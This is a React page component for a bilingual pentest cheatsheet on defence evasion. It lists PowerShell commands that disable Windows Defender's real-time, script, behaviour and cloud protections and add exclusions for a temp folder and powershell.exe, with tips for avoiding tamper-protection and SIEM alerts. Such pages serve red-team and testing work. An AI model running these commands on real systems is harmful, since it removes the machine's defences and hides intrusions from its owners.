"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function DisableAvPage() {
  const { lang } = useLanguage();

  const disableDefender =
`Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true`;

  const disableFull =
`Set-MpPreference -DisableIntrusionPreventionSystem $true \`
                 -DisableIOAVProtection $true \`
                 -DisableRealtimeMonitoring $true \`
                 -DisableScriptScanning $true \`
                 -DisableBehaviorMonitoring $true \`
                 -DisableBlockAtFirstSeen $true \`
                 -MAPSReporting Disabled \`
                 -SubmitSamplesConsent NeverSend`;

  const checkStatus = `Get-MpComputerStatus | Select-Object -Property *Enabled*, *Disabled*`;

  const exclusions =
`# Ajouter une exclusion de chemin
Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"

# Ajouter une exclusion de processus
Add-MpPreference -ExclusionProcess "powershell.exe"`;

  const sections = [
    {
      id: "disable-defender",
      title: lang === "fr" ? "Désactiver Defender (minimal)" : "Disable Defender (minimal)",
      entries: [
        {
          cmd: disableDefender,
          why: lang === "fr"
            ? "Désactive la protection réseau (IPS), le scan des téléchargements (IOAV) et la protection temps réel. Nécessite des droits admin. Persistant jusqu'au prochain reboot ou réactivation manuelle."
            : "Disables network protection (IPS), download scanning (IOAV), and real-time protection. Requires admin rights. Persists until next reboot or manual re-enable.",
        },
      ],
    },
    {
      id: "disable-full",
      title: lang === "fr" ? "Désactiver Defender (complet)" : "Disable Defender (full)",
      entries: [
        {
          cmd: disableFull,
          why: lang === "fr"
            ? "Désactive en plus le scan des scripts PowerShell, le monitoring comportemental, le blocage au premier contact, et la remontée MAPS/cloud. Réduire au minimum nécessaire pour éviter les alertes inutiles."
            : "Additionally disables PowerShell script scanning, behavior monitoring, first-seen blocking, and MAPS/cloud reporting. Disable only what is needed to avoid unnecessary noise.",
        },
      ],
    },
    {
      id: "status",
      title: lang === "fr" ? "Vérifier l'état" : "Check status",
      entries: [
        {
          cmd: checkStatus,
          why: lang === "fr"
            ? "Affiche toutes les propriétés Enabled/Disabled de Defender. Confirmer que les options ciblées sont bien désactivées."
            : "Displays all Enabled/Disabled Defender properties. Confirm the targeted options are actually disabled.",
        },
      ],
    },
    {
      id: "exclusions",
      title: lang === "fr" ? "Exclusions" : "Exclusions",
      note: lang === "fr"
        ? "Alternative moins bruyante à la désactivation complète"
        : "Less noisy alternative to full disabling",
      entries: [
        {
          cmd: exclusions,
          why: lang === "fr"
            ? "Ajouter des exclusions ciblées plutôt que désactiver Defender entièrement. Moins susceptible de déclencher des alertes de type tamper protection ou SIEM."
            : "Add targeted exclusions rather than disabling Defender entirely. Less likely to trigger tamper protection alerts or SIEM rules.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Defense Evasion</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Disable AV</h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "Désactivation de Windows Defender via PowerShell. Requiert des droits admin."
            : "Disabling Windows Defender via PowerShell. Requires admin rights."}
        </p>
      </header>

      {sections.map((section) => (
        <section key={section.id} id={section.id} className="mb-10">
          <h2 className="mb-1 font-mono text-xs uppercase tracking-widest text-primary">
            {section.title}
          </h2>
          {section.note && (
            <p className="mb-4 font-mono text-[10px] text-muted-foreground/50">{section.note}</p>
          )}
          <div className={section.note ? "mt-3 space-y-4" : "mt-4 space-y-4"}>
            {section.entries.map((entry, i) => (
              <CheatsheetCommandCard key={i} cmd={entry.cmd} why={entry.why} lang={lang} />
            ))}
          </div>
        </section>
      ))}
    </div>
  );
}
